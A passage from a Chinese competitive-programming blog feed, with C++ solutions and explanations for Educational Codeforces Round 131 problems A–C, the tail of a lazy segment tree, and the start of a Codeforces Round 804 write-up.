class="number">1</span>)*lazy2;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].lazy1*=lazy1;</span><br><span class="line">    tree[i].lazy2*=lazy1;</span><br><span class="line">    tree[i].lazy1%=p;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">    tree[i].lazy2+=lazy2;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_down</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lazy1=tree[i].lazy1,lazy2=tree[i].lazy2;</span><br><span class="line">    tree[i].lazy1=<span class="number">1</span>;</span><br><span class="line">    tree[i].lazy2=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;query(%lld,%lld,%lld)\n&quot;,l,r,now);</span></span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        ans+=tree[now].sum;</span><br><span class="line">        <span class="comment">//printf(&quot;sum=%d\n&quot;,tree[now].sum);</span></span><br><span class="line">        ans%=p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,<span class="number">1</span>,num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].r+tree[now].l&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;p);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,a+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">signed</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">signed</span> op,l,r,num;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">mul</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">add</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;l=%d r=%d\n&quot;,l,r);</span></span><br><span class="line">            <span class="built_in">query</span>(l,r,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数据结构 </category>
          
          <category> 线段树 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Educational Codeforces Round 131(Div.2)解析</title>
      <link href="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/"/>
      <url>/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>今天掉大分，预估回青名吧。实时<a href="https://www.bilibili.com/video/BV1KN4y1u7qB">录屏</a></p><span id="more"></span><h2 id="A-Grass-Field"><a href="#A-Grass-Field" class="headerlink" title="A. Grass Field"></a>A. Grass Field</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定2×2的草地，一次操作能任意清除三块草地，问最多几次清除所有草地。那就判断草地个数，只有全是草地的时候才要两次，没有草地的时候一次不用，其余情况都是一次。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>,a,a+<span class="number">1</span>,a+<span class="number">2</span>,a+<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">int</span> sum=a[<span class="number">1</span>]+a[<span class="number">2</span>]+a[<span class="number">3</span>]+a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(sum==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum!=<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Permutation"><a href="#B-Permutation" class="headerlink" title="B. Permutation"></a>B. Permutation</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是说，我们需要让排列中的一个值（这个值是<code>a[i+1]/a[i]</code>）尽可能多的出现，一样多的情况下输出值较大的。这题贪就完了，我们长度超过4的我们就选2。从1开始2倍去填上数，再选没填过的，也是2倍2倍输出，这样就达到了最优状态。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2\n1 2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;3\n2 1 3&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="number">1</span>)&#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=n;j*=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,j);</span><br><span class="line">            a[j]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>m个工作，n个人，每个工作有一个熟练工，如果让熟练工完成，那么只需要一个小时，让其余工人完成都需要两个小时。</p><p>我们直接二分答案就行了，至于check函数，我们就先计算每个工人的熟练工作个数。</p><p>然后做出如下算法：</p><ol><li>对于一个人，若它熟练a[i]种工作，那么它会尽量花费a[i]的时间去做完这a[i]的工作，若时间有剩，那么剩余时间做 <code>(t-a[i])/2</code> 个工作。</li><li>判断n个工人在t时间内是否能完成m项工作只需把工人按照以上算法加起来，判断一下大小就行了。</li></ol><p>时间上二分，选择最大可能时间，最大可能时间就是把所有人都当场不熟练工计算就好了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m,t;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;a[%d]=%d\n&quot;,i,a[i]);</span></span><br><span class="line"><span class="comment">//        if(!a[i])&#123;</span></span><br><span class="line"><span class="comment">//            break;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;t)&#123;</span><br><span class="line">            ans+=a[i];</span><br><span class="line">            ans+=(t-a[i])/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;time=%d ans=%d\n&quot;,t,ans);</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        a[x]++;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line">    t=(m/n)*<span class="number">2</span>+(!!(m%n))*<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">1</span>,r=t;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//printf(&quot;mid=%d\n&quot;,mid);</span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="built_in">cal</span>(mid);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(res&lt;m)&#123;</span><br><span class="line">            l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,l);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>啥也不说了，猛练吧。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>codeforces round 804(div2)解析</title>
      <link href="/2022/07/05/Codeforces%20Round%20804(Div.2)/"/>
      <url>/2022/07/05/Codeforces%20Round%20804(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>好久没打过cf了，今天重温一下，可能手比较生了，打得状态不太好。实时<a href="https://www.bilibili.com/video/BV1xB4y1W79t/">录屏</a></p><span id="more"></span><h2 id="A-The-Third-Three-Number-Problem"><a href="#A-The-Third-Three-Number-Problem" class="headerlink" title="A. The Third Three Number Problem"></a>A. The Third Three Number Problem</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题意比较简单，给定一个数，构造三个数使得 <code>a^b+b^c+c^a==n</code>。首先不难想到，奇数一定无法构造，因为奇数异或偶数结果一定为奇数，奇数与奇数以及偶数与偶数异或结果一定为偶数，则我们有以下结论：</p><ul><li>若三个数中没有奇数，则相互异或和一定为偶数。</li><li>若三个数中只有一个奇数，则异或的结果会产生2个奇数，一个偶数，最终和仍为偶数。</li><li>若三个数中有两个奇数，则异或的结果产生2个奇数，一个偶数，最终和也为偶数。</li><li>若三个数全是奇数，则异或的结果产生全为偶数，最终结果也是偶数。</li></ul><p>不难发现我们最终结果必是偶数。</p><p>那么如果不是偶数那么直接输出-1，若是则我们令其中两个数为1，那么最终结果就是 <code>n=1^1+1^x+1^x=2*(1^x)</code>。我们非常容易能解出 <code>x</code> 的值。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>==<span 